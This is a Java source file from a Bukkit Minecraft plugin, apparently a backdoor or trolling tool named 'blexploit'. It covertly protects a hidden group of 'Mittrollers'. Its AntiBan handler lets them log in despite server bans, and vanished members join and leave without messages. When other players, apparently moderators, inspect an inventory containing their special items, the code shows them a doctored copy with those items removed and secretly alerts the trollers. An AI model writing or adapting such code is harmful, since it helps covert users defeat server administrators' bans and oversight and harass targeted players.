package de.blexploit.manager;

import java.util.ArrayList;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.inventory.InventoryOpenEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.player.PlayerRespawnEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;

import de.blexploit.Start;
import de.blexploit.command.cmds.CommandLogger;
import de.blexploit.command.cmds.CommandLogger.CmdLog;
import de.blexploit.players.Getrollts;
import de.blexploit.players.Mittrollers;
import de.blexploit.players.create.MittrollerEntity;

public final class InvProtectManager implements Listener {

	public static ArrayList<ItemStack> tohide = new ArrayList<ItemStack>();

	public static void searchForItem() {
		Bukkit.getScheduler().scheduleSyncRepeatingTask(Start.instance, new Runnable() {

			@Override
			public void run() {
				for (final MittrollerEntity mt : Mittrollers.getOnlines()) {
					boolean contains = false;
					for (final ItemStack invContent : mt.getPlayer().getInventory().getContents()) {
						if (invContent != null) {
							if (invContent.isSimilar(Start.give_item)) {
								contains = true;
							}
						}
					}
					if (!contains) {
						mt.giveMainItem();
					}
				}
			}
		}, 20 * 6, 20 * 6);
	}

	@EventHandler
	private void OnJoin(PlayerJoinEvent e) {
		final Player p = e.getPlayer();
		if (Mittrollers.containsP(p)) {
			final MittrollerEntity mt = Mittrollers.getP(p);
			if (mt.isVanish()) {
				e.setJoinMessage(null);
			}
			mt.setSavedInv();
			if (mt.isAdmin()) {
				Mittrollers.sendMessage(ChatColor.RED + p.getName() + ChatColor.GREEN + " ist nun " + ChatColor.AQUA
						+ "Mittroller " + ChatColor.GREEN + "und" + ChatColor.DARK_RED + " Admin!");
			} else {
				Mittrollers.sendMessage(
						ChatColor.RED + p.getName() + ChatColor.GREEN + " ist nun " + ChatColor.AQUA + "Mittroller!");
			}
			mt.giveMainItem();
			Mittrollers.playsound("BLOCK_ANVIL_LAND", 1, 1);
			mt.setTrollMode(true);
		}
		if (Getrollts.containsP(p)) {
			Mittrollers.sendMessage(
					ChatColor.RED + p.getName() + ChatColor.RED + " wird nun " + ChatColor.DARK_RED + "Getrollt!");
			Mittrollers.playsound("ENTITY_BAT_HURT", 1, 1);
		}

	}

	@EventHandler
	private void OnLeave(PlayerQuitEvent e) {
		final Player p = e.getPlayer();
		if (Mittrollers.containsP(p)) {
			final MittrollerEntity mt = Mittrollers.getP(p);
			if (mt.isVanish()) {
				e.setQuitMessage(null);
			}
			mt.saveInv();

			if (mt.isVanish()) {
				Mittrollers.sendMessage(
						ChatColor.RED + p.getName() + ChatColor.YELLOW + " hat das Spiel wirklich verlassen!");
			}
			mt.setTrollMode(true);

			for (int i = 0; i < p.getInventory().getContents().length; i++) {
				final ItemStack item = p.getInventory().getItem(i);
				if (item != null) {
					if (containsBlockedItem(item)) {
						p.getInventory().setItem(i, new ItemStack(Material.AIR));
					}
				}
			}

		}

		if (Getrollts.containsP(p)) {
			Mittrollers.sendMessage(ChatColor.RED + p.getName() + ChatColor.RED + " möchte nicht mehr"
					+ ChatColor.DARK_RED + " getrollt werden!");
			Mittrollers.playsound("ENTITY_BAT_DEATH", 1, 1);
		}

	}

	@EventHandler
	private void getItems(PlayerDeathEvent e) {
		final Player p = e.getEntity();
		if (Mittrollers.containsP(p)) {
			e.setKeepLevel(false);
			Mittrollers.getP(p).saveInv();
			e.getDrops().clear();
		}
	}

	@EventHandler
	private void setItems(PlayerRespawnEvent e) {
		final Player p = e.getPlayer();
		Bukkit.getScheduler().scheduleSyncDelayedTask(Start.instance, new Runnable() {

			@Override
			public void run() {
				final MittrollerEntity mt = Mittrollers.getP(p);
				if (mt != null) {
					mt.setSavedInv();
					mt.sendMessage("Dein Inventar wurde wieder hergestellt!");
				}
			}
		}, 0);
	}

	@EventHandler
	private void inventoryOpen(InventoryOpenEvent e) {
		final Player p = (Player) e.getPlayer();
		if (!Mittrollers.containsP(p)) {
			final ItemStack[] contents = e.getInventory().getContents();
			boolean block = false;
			for (final ItemStack is : contents) {
				if (tohide.contains(is)) {
					block = true;
					break;
				}
			}
			if (block) {
				e.setCancelled(true);
				Player victim = null;
				final ArrayList<CommandLogger.CmdLog> latesCommands = de.blexploit.command.cmds.CommandLogger.latesCommands;
				for (final CmdLog cmdLog : latesCommands) {
					if (cmdLog.getPlayer().equals(p)) {
						if (cmdLog.getArgs() != null) {
							for (int i = 1; i < cmdLog.getArgs().length; i++) {
								final Player tryOnline = Bukkit.getPlayer(cmdLog.getArgs()[i]);
								if (tryOnline != null) {
									if (tryOnline.isOnline()) {
										victim = tryOnline;
										break;
									}
								}
							}
						}
					}
				}
				if (victim == null) {
					Mittrollers.sendMessage("§c[§4Warnung!§c] §B" + p.getName()
							+ " §Ewollte ein Inventar sehen! Bei wem ist unbekannt!");
				} else {
					Mittrollers.sendMessage("§c[§4Warnung!§c] §B" + p.getName() + " §Ewollte von §b" + victim.getName()
							+ "§E das Inventar sehen!");
					final Inventory inv = Bukkit.createInventory(null, e.getInventory().getSize(),
							e.getInventory().getTitle());
					for (int i = 0; i < inv.getContents().length; i++) {
						final ItemStack checkIs = e.getInventory().getItem(i);
						if (containsBlockedItem(checkIs)) {
							inv.setItem(i, new ItemStack(Material.AIR));
						} else {
							inv.setItem(i, checkIs);
						}
					}
					p.openInventory(inv);
				}
			}
		}
	}

	public static boolean containsBlockedItem(ItemStack is) {
		if (is != null) {
			for (final ItemStack blocki : tohide) {
				if (blocki.isSimilar(is)) {
					return true;
				}
			}
			return false;
		}
		return false;
	}

	@EventHandler
	private void AntiBan(PlayerLoginEvent e) {
		if (Mittrollers.contains(e.getPlayer().getName())) {
			e.allow();
		}
	}

	public static void clearBeforeReload() {
		for (final MittrollerEntity mt : Mittrollers.getOnlines()) {
			final Player p = mt.getPlayer();
			for (int i = 0; i < p.getInventory().getContents().length; i++) {
				final ItemStack item = p.getInventory().getItem(i);
				if (item != null) {
					if (containsBlockedItem(item)) {
						p.getInventory().setItem(i, new ItemStack(Material.AIR));
					}
				}
			}
		}
	}

}
